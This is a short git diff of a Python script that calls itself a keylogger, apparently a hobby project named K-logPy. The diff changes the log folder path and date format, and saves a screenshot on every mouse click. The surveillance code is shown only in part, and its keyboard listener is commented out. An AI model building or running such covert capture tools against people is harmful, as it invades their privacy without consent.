@@ -4,12 +4,12 @@ from datetime import datetime
 import re, os, pyautogui as pyt
 
 datanow = datetime.now()
-data = datanow.strftime('%D_%M')
-saves = r'C:\Users\arthu\Desktop\Save\Content_' + data + '\\'
-arqlog = saves + 'keylogger.log'
+data = datanow.strftime('%d_%m')
+folder_new = r'C:\Users\arthu\Desktop\Projetos\K-logPy\screens_' + data + '\\'
+arqlog = folder_new + 'keylogger.log'
 
 try:
-    os.mkdir(saves)
+    os.makedirs(folder_new)
 except:
     pass
 
@@ -21,9 +21,8 @@ def on_click(x, y, button, pressed):
         screenshot = pyt.screenshot()
         hora = datetime.now()
         horaprint = hora.strftime('%H_%M_%S')
-        file_var = 'printklp_'+ horaprint +'.jpg'
-        screenshot.save(os.path.join(saves + file_var))
-
+        file_var = folder_new + horaprint +'.jpg'
+        screenshot.save(os.path.join(file_var))
 
 #keyboardListener = KeyboardListener(on_press=on_press)
 mouseListener = MouseListener(on_click=on_click)
